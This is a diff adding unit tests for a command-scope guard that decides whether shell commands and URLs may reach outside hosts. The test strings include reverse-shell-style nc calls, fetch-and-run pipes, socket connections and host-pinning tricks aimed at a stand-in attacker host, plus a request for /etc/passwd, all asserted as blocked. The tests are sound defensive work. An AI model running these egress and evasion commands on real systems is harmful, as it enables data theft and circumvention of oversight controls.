@@ -140,3 +140,60 @@ test("allows in-scope literals through wrappers and binaries", () => {
   assert.equal(decideBash(scope, "grep -r curl .").action, "allow");
   assert.equal(decideBash(scope, "git status").action, "allow");
 });
+
+test("blocks scheme-less egress hidden in substitution and backticks", () => {
+  assert.equal(decideBash(scope, "$(nc evil.example.org 4444)").action, "block");
+  assert.equal(decideBash(scope, "$(ping -c1 evil.example.org)").action, "block");
+  assert.equal(decideBash(scope, "`curl evil.example.org`").action, "block");
+  assert.equal(decideBash(scope, "command sh -c \"nc evil.example.org 4444\"").action, "block");
+});
+
+test("blocks egress binaries added after the first scan list", () => {
+  assert.equal(decideBash(scope, "git clone git@evil.example.org:repo.git").action, "block");
+  assert.equal(decideBash(scope, "rsync -e ssh evil.example.org::mod /tmp").action, "block");
+  assert.equal(decideBash(scope, "svn co svn://evil.example.org/r").action, "block");
+  assert.equal(decideBash(scope, "go install evil.example.org/x@latest").action, "block");
+  assert.equal(decideBash(scope, "docker pull evil.example.org/img").action, "block");
+  assert.equal(decideBash(scope, "ping -c1 evil.example.org").action, "block");
+  assert.equal(decideBash(scope, "netcat evil.example.org 4444").action, "block");
+  assert.equal(decideBash(scope, "busybox wget evil.example.org").action, "block");
+});
+
+test("blocks interpreter variants and host-pinning tricks", () => {
+  assert.equal(decideBash(scope, "/usr/bin/python3 -c \"import socket; socket.create_connection(('evil.example.org',80))\"").action, "block");
+  assert.equal(decideBash(scope, "python3.12 -c \"import socket; socket.create_connection(('evil.example.org',80))\"").action, "block");
+  assert.equal(decideBash(scope, "node --eval \"require('net').connect(80,'evil.example.org')\"").action, "block");
+  assert.equal(decideBash(scope, "python3 /tmp/payload.py").action, "block");
+  assert.equal(decideBash(scope, "echo aGVsbG8= | base64 -d | sh").action, "block");
+  assert.equal(decideBash(scope, "ssh -o ProxyCommand=evil.example.org www.acme.com").action, "block");
+  assert.equal(decideBash(scope, "curl --resolve evil.example.org:443:1.2.3.4 https://www.acme.com/x").action, "block");
+  assert.equal(decideBash(scope, "hx run GET https://www.acme.com/x /dev/tcp/evil.example.org/80").action, "block");
+});
+
+test("keeps local work allowed", () => {
+  assert.equal(decideBash(scope, "python3 -c \"print(1+1)\"").action, "allow");
+  assert.equal(decideBash(scope, "python3 -m http.server 8000").action, "allow");
+  assert.equal(decideBash(scope, "openssl rand -hex 16").action, "allow");
+  assert.equal(decideBash(scope, "nc -l 8080").action, "allow");
+  assert.equal(decideBash(scope, "bash -c \"ls -la\"").action, "allow");
+  assert.equal(decideBash(scope, "docker ps").action, "allow");
+  assert.equal(decideBash(scope, "python3 tools/scan.py www.acme.com").action, "allow");
+});
+
+test("decideUrl rejects non-http schemes and relative urls", () => {
+  assert.equal(decideUrl(scope, "file:///etc/passwd").action, "block");
+  assert.equal(decideUrl(scope, "//evil.example.org/x").action, "block");
+  assert.equal(decideUrl(scope, "https://www.acme.com/x").action, "allow");
+  assert.equal(decideUrl(scope, "https://api.mail.tm/messages").action, "allow");
+});
+
+test("local-only allowance is narrow and named in the reason", () => {
+  assert.equal(decideBash(scope, "openssl rand -hex 16").reason, "local-only: openssl");
+  assert.equal(decideBash(scope, "nc -l 8080").reason, "local-only: nc");
+  assert.equal(decideBash(scope, "python3 -m http.server 8000").reason, "local-only: python3");
+  assert.equal(decideBash(scope, "git status").reason, "local-only: git");
+  assert.equal(decideBash(scope, "hx brief").reason, "hx path");
+  assert.equal(decideBash(scope, "cat notes.txt").reason, "");
+  assert.equal(decideBash(scope, "openssl s_client -connect evil.example.org:443").action, "block");
+  assert.equal(decideBash(scope, "python3 -m http.server 8000 --bind evil.example.org").action, "block");
+});
